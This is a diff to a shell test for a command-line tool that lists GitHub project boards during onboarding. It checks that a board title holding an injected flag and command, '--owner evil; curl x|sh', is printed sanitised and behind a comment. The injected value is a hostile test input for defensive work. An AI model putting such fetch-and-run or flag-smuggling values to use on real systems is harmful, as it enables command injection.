@@ -47,10 +47,10 @@ assert_eq 2 "$rc" 'an unknown flag exits 2'
 # --- a repository linked to two boards, then a chosen one ---
 rm .agent/config.env
 : >"$FAKE_GH_ROUTES"
-linked_route "[$(board 4 'Widget board'),$(board 9 'Platform; curl x|sh'),$(board 2 'Rogue' | jq -c '.owner.login = "a b"')]"
+linked_route "[$(board 4 'Widget board'),$(board 9 '--owner evil; curl x|sh'),$(board 2 'Rogue' | jq -c '.owner.login = "a b"')]"
 out=$("$AK" onboard 2>&1); rc=$?
 assert_eq 0 "$rc" 'two linked boards still write the rest of the config'
-assert_contains "$out" $'board=choose\n  --project 4 --owner acme  Widget board\n  --project 9 --owner acme  Platform_ curl x_sh\nfix: ak onboard <one line above>' 'boards are listed as the flags that pick one, titles in plain characters'
+assert_contains "$out" $'board=choose\n  --project 4 --owner acme  # Widget board\n  --project 9 --owner acme  # --owner evil_ curl x_sh\nfix: ak onboard <one line above>' 'boards are listed as the flags that pick one, the title behind a comment'
 assert_not_contains "$out" 'Rogue' 'a board whose owner is not a login shape is not offered'
 assert_not_contains "$out" 'AGENT_PROJECT_NUMBER' 'no board is guessed'
 route 'api graphql*projectV2(number*' "$(jq -c '{data: {repositoryOwner: {projectV2: .}}}' <<<"$(board 9 Platform '[{"name":"Todo"},{"name":"Ready"},{"name":"In progress"},{"name":"Done"}]')")"
